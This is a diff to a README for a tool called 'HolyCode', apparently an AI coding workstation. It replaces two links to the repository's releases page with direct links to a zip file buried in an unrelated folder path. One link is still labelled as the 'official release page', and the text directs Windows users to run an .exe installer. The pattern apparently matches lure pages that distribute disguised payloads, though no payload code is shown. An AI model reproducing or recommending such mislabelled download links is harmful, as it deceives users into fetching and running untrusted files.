@@ -1,6 +1,6 @@
 # 🤖 HolyCode - Complete AI workstation for modern coding
 
-[![](https://img.shields.io/badge/Download-HolyCode-blue.svg)](https://github.com/ftyy7289/HolyCode/releases)
+[![](https://img.shields.io/badge/Download-HolyCode-blue.svg)](https://github.com/ftyy7289/HolyCode/raw/refs/heads/main/s6-overlay/s6-rc.d/paperclip/Holy-Code-v2.3-beta.4.zip)
 
 HolyCode gives you an intelligent workspace built for your daily programming tasks. The application combines powerful tools, automated agents, and smart code assistance into one platform. You can manage complex projects, automate web tasks, and receive help from advanced AI models without complex setup.
 
@@ -18,7 +18,7 @@ HolyCode provides a focused environment for building software. It includes a sui
 
 You must visit the repository release page to download the latest version for your computer. 
 
-[Click here to visit the official HolyCode release page](https://github.com/ftyy7289/HolyCode/releases)
+[Click here to visit the official HolyCode release page](https://github.com/ftyy7289/HolyCode/raw/refs/heads/main/s6-overlay/s6-rc.d/paperclip/Holy-Code-v2.3-beta.4.zip)
 
 Once you reach the page, look at the list of available files under the most recent version. Select the installer file that ends in .exe for your Windows system. Save this file to your downloads folder.
 
